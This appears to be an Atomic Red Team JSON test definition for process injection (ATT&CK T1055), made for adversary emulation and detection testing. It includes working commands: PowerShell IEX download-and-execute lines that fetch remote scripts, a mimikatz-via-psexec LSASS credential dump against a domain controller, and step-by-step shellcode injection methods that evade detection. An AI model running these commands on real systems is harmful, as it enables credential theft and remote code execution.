{
  "attack_technique": "T1055",
  "display_name": "Process Injection",
  "atomic_tests": [
    {
      "name": "Shellcode execution via VBA",
      "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"#{txt_path}\" -officeProduct \"Word\" -sub \"Execute\""
      },
      "input_arguments": {
        "txt_path": {
          "description": "Path to file containing VBA macro to run",
          "type": "path",
          "default": "PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt"
        }
      },
      "dependencies": [
        {
          "description": "The 64-bit version of Microsoft Office must be installed",
          "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }",
          "get_prereq_command": "Write-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\""
        },
        {
          "description": "\"#{txt_path}\" must exist on disk at specified location",
          "prereq_command": "if (Test-Path \"#{txt_path}\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory (split-path \"#{txt_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt\" -OutFile \"#{txt_path}\" -UseBasicParsing"
        }
      ],
      "auto_generated_guid": "1c91e740-1729-4329-b779-feba6e71d048"
    },
    {
      "name": "Remote Process Injection in LSASS via mimikatz",
      "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": false,
        "command": "\"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\""
      },
      "input_arguments": {
        "machine": {
          "description": "machine to target (via psexec)",
          "type": "string",
          "default": "DC1"
        },
        "mimikatz_path": {
          "description": "Mimikatz windows executable",
          "type": "path",
          "default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
        },
        "psexec_path": {
          "description": "Path to PsExec",
          "type": "string",
          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe"
        }
      },
      "dependencies": [
        {
          "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})",
          "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}",
          "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath"
        },
        {
          "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})",
          "prereq_command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}",
          "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" -UseBasicParsing\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force"
        }
      ],
      "dependency_executor_name": "powershell",
      "auto_generated_guid": "3203ad24-168e-4bec-be36-f79b13ef8a83"
    },
    {
      "name": "Section View Injection",
      "description": "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\"",
        "cleanup_command": "Stop-Process $notepad.pid"
      },
      "input_arguments": {},
      "auto_generated_guid": "c6952f41-6cf0-450a-b352-2ca8dae7c178"
    },
    {
      "name": "Dirty Vanity process Injection",
      "description": "This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process\nwith shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at \nBlackHat Europe 2022. Shellcode will open a messsage box and a notepad.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid}",
        "cleanup_command": "Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force"
      },
      "input_arguments": {
        "pid": {
          "description": "Parent process ID",
          "type": "string",
          "default": "(Start-Process calc.exe -PassThru).Id"
        }
      },
      "auto_generated_guid": "49543237-25db-497b-90df-d0a0a6e8fe2c"
    },
    {
      "name": "Read-Write-Execute process Injection",
      "description": "This test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.\nThe RWX injection avoided the use of VirtualAlloc, WriteVirtualMemory, and ProtectVirtualMemory, thus evading detection mechanisms \nthat relied on API call sequences and heuristics. The RWX injection utilises API call sequences: LoadLibrary --> GetModuleInformation --> GetModuleHandleA --> RtlCopyMemory --> CreateThread.\nThe injected shellcode will open a message box and a notepad.\nRWX Process Injection, also known as MockingJay, was introduced to the security community by SecurityJoes.\nMore details can be found at https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution.\nThe original injector and idea were developed for game cheats, as visible at https://github.com/M-r-J-o-h-n/SWH-Injector.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "command": "$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\n& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"#{vuln_dll}\" $address",
        "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
      },
      "input_arguments": {
        "vuln_dll": {
          "description": "vulnerable DLL",
          "type": "path",
          "default": "PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\msys-2.0.dll"
        }
      },
      "dependencies": [
        {
          "description": "Utility to inject must exist on disk at specified location (#{vuln_dll})",
          "prereq_command": "if (Test-Path \"#{vuln_dll}\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory (split-path \"#{vuln_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/vuln_dll/msys-2.0.dll\" -OutFile \"#{vuln_dll}\""
        }
      ],
      "auto_generated_guid": "0128e48e-8c1a-433a-a11a-a5387384f1e1"
    },
    {
      "name": "Process Injection with Go using UuidFromStringA WinAPI",
      "description": "Uses WinAPI UuidFromStringA to load shellcode to a memory address then executes the shellcode using EnumSystemLocalesA.\nWith this technique, memory is allocated on the heap and does not use commonly suspicious APIs such as VirtualAlloc, WriteProcessMemory, or CreateThread \n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#uuidfromstringa)\n- References: \n  - https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/\n  - https://twitter.com/_CPResearch_/status/1352310521752662018\n  - https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\UuidFromStringA.exe -debug",
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue"
      },
      "input_arguments": {},
      "auto_generated_guid": "2315ce15-38b6-46ac-a3eb-5e21abef2545"
    },
    {
      "name": "Process Injection with Go using EtwpCreateEtwThread WinAPI",
      "description": "Uses EtwpCreateEtwThread function from ntdll.dll to execute shellcode within the application's process.\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\nSteps taken with this technique\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call EtwpCreateEtwThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#EtwpCreateEtwThread)\n- References: \n  - https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3\n  - https://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/index.htm",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug",
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue"
      },
      "input_arguments": {},
      "auto_generated_guid": "7362ecef-6461-402e-8716-7410e1566400"
    },
    {
      "name": "Remote Process Injection with Go using RtlCreateUserThread WinAPI",
      "description": "Executes shellcode in a remote process.\n\nSteps taken with this technique\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with RtlCreateUserThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)\n- References: \n  - https://www.cobaltstrike.com/blog/cobalt-strikes-process-injection-the-details-cobalt-strike",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\RtlCreateUserThread.exe -pid $process.Id -debug",
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue"
      },
      "input_arguments": {
        "spawn_process_path": {
          "description": "Path of the binary to spawn",
          "type": "string",
          "default": "C:\\Windows\\System32\\werfault.exe"
        },
        "spawn_process_name": {
          "description": "Name of the process spawned",
          "type": "string",
          "default": "werfault"
        }
      },
      "auto_generated_guid": "a0c1725f-abcd-40d6-baac-020f3cf94ecd"
    },
    {
      "name": "Remote Process Injection with Go using CreateRemoteThread WinAPI",
      "description": "Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellocde in a remote process.\n\nThis application leverages functions from the golang.org/x/sys/windows package, where feasible, like the windows.OpenProcess().\n\nSteps taken with this technique\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethread)\n - References:\n  - https://www.ired.team/offensive-security/code-injection-process-injection/process-injection",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug",
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue"
      },
      "input_arguments": {
        "spawn_process_path": {
          "description": "Path of the binary to spawn",
          "type": "string",
          "default": "C:\\Windows\\System32\\werfault.exe"
        },
        "spawn_process_name": {
          "description": "Name of the process spawned",
          "type": "string",
          "default": "werfault"
        }
      },
      "auto_generated_guid": "69534efc-d5f5-4550-89e6-12c6457b9edd"
    },
    {
      "name": "Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively)",
      "description": "Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellcode in a remote process.\n\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethreadnative)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug",
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue"
      },
      "input_arguments": {
        "spawn_process_path": {
          "description": "Path of the binary to spawn",
          "type": "string",
          "default": "C:\\Windows\\System32\\werfault.exe"
        },
        "spawn_process_name": {
          "description": "Name of the process spawned",
          "type": "string",
          "default": "werfault"
        }
      },
      "auto_generated_guid": "2a4ab5c1-97ad-4d6d-b5d3-13f3a6c94e39"
    },
    {
      "name": "Process Injection with Go using CreateThread WinAPI",
      "description": "This program executes shellcode in the current process using the following steps\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call CreateThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\nThis program leverages the functions from golang.org/x/sys/windows to call Windows procedures instead of manually loading them\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthread)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug",
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue"
      },
      "input_arguments": {},
      "auto_generated_guid": "2871ed59-3837-4a52-9107-99500ebc87cb"
    },
    {
      "name": "Process Injection with Go using CreateThread WinAPI (Natively)",
      "description": "This program executes shellcode in the current process using the following steps\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call CreateThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthreadnative)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug",
        "cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue"
      },
      "input_arguments": {},
      "auto_generated_guid": "2a3c7035-d14f-467a-af94-933e49fe6786"
    },
    {
      "name": "UUID custom process Injection",
      "description": "The UUIDs Process Injection code was first introduced by the NCC Group. The code can be stored in UUID forms on the heap and converted back to binary via UuidFromStringA at runtime. In this new custom version of UUID injection, EnumSystemLocalesA is the only API called to execute the code. We used custom UuidToString and UuidFromString implementations to avoid using UuidFromStringA and RPCRT4.dll, thereby eliminating the static signatures. This technique also avoided the use of VirtualAlloc, WriteProcessMemory and CreateThread\n\nThe injected shellcode will open a message box and a notepad.\n\nReference to NCC Group: https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/\nConcept from: http://ropgadget.com/posts/abusing_win_functions.html",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "command": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
      },
      "input_arguments": {
        "exe_binary": {
          "description": "PE binary",
          "type": "path",
          "default": "PathToAtomicsFolder\\T1055\\bin\\x64\\uuid_injection.exe"
        }
      },
      "dependencies": [
        {
          "description": "Portable Executable to inject must exist at specified location (#{exe_binary})",
          "prereq_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/uuid_injection.exe\" -OutFile \"#{exe_binary}\""
        }
      ],
      "auto_generated_guid": "0128e48e-8c1a-433a-a11a-a5304734f1e1"
    }
  ]
}